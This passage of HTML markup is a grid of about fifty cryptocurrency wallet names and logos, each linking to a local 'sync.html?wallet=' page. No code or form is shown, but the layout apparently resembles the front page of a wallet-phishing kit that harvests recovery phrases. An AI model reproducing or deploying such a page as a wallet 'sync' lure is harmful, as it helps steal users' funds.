                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756.jpeg" alt="Loopring Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Loopring Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=trustology.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6.jpeg" alt="TrustVault">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">TrustVault</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=atomicwallet.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a.jpeg" alt="Atomic">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Atomic</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=coin98.app" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e.jpeg" alt="Coin98">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Coin98</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=coolwallet.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d.jpeg" alt="CoolWallet S">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">CoolWallet S</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=alicedapp.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693.jpeg" alt="Alice">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Alice</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=alphawallet.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpeg" alt="AlphaWallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">AlphaWallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=dcentwallet.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63.jpeg" alt="D'CENT Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">D'CENT Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=zel.network" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09.jpeg" alt="ZelCore">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">ZelCore</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=nash.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14.jpeg" alt="Nash">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Nash</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=coinomi.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814.jpeg" alt="Coinomi">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Coinomi</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=gridplus.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702.jpeg" alt="GridPlus">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">GridPlus</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=cybavo.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5.jpeg" alt="CYBAVO Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">CYBAVO Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=tokenary.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0.jpeg" alt="Tokenary">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Tokenary</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=toruswallet.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50.jpeg" alt="Torus">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Torus</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=spatium.net" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09.jpeg" alt="Spatium">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Spatium</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=safepal.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpeg" alt="SafePal">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">SafePal</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=infinitowallet.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6.jpeg" alt="Infinito">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Infinito</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=wallet.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b.jpeg" alt="wallet.io">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">wallet.io</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=infinitywallet.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f.jpeg" alt="Infinity Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Infinity Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=ownbit.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad.jpeg" alt="Ownbit">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Ownbit</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=easypocket.app" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c.jpeg" alt="EasyPocket">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">EasyPocket</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=mtpelerin.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb.jpeg" alt="Bridge Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Bridge Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=sparkpoint.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1.jpeg" alt="SparkPoint">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">SparkPoint</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=viawallet.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1.jpeg" alt="ViaWallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">ViaWallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=bitkeep.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106.jpeg" alt="BitKeep">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">BitKeep</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=vision-crypto.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c.jpeg" alt="Vision">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Vision</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=peakdefi.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b.jpeg" alt="PEAKDEFI Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">PEAKDEFI Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=unstoppable.money" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd.jpeg" alt="Unstoppable Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Unstoppable Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=halodefi.org" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0.jpeg" alt="HaloDeFi Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">HaloDeFi Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=dokwallet.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e.jpeg" alt="Dok Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Dok Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=authentrend.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5.jpeg" alt="AT.Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">AT.Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=midasprotocol.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719.jpeg" alt="Midas Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Midas Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=ellipal.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef.jpeg" alt="Ellipal">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Ellipal</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=keyring.app" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3.jpeg" alt="KEYRING PRO">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">KEYRING PRO</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=aktionariat.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.jpeg" alt="Aktionariat">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Aktionariat</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=talken.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c.jpeg" alt="Talken Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Talken Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=xinfin.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4.jpeg" alt="XinFin XDC Network">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">XinFin XDC Network</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=flarewallet.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c.jpeg" alt="Flare Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Flare Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=kyberswap.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670.jpeg" alt="KyberSwap">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">KyberSwap</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=atoken.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0.jpeg" alt="AToken Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">AToken Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=tongue.fi" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9.jpeg" alt="Tongue Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Tongue Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=rsk.co" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346.jpeg" alt="RWallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">RWallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=plasmapay.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70.jpeg" alt="PlasmaPay">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">PlasmaPay</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=o3.network" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0.jpeg" alt="O3Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">O3Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=me.hashkey.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c.jpeg" alt="HashKey Me">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">HashKey Me</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=jadewallet.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950.jpeg" alt="Jade Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Jade Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=guarda.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266.jpeg" alt="Guarda Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Guarda Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.htmlc?wallet=defiantapp.tech" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215.jpeg" alt="Defiant">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Defiant</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=trusteeglobal.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
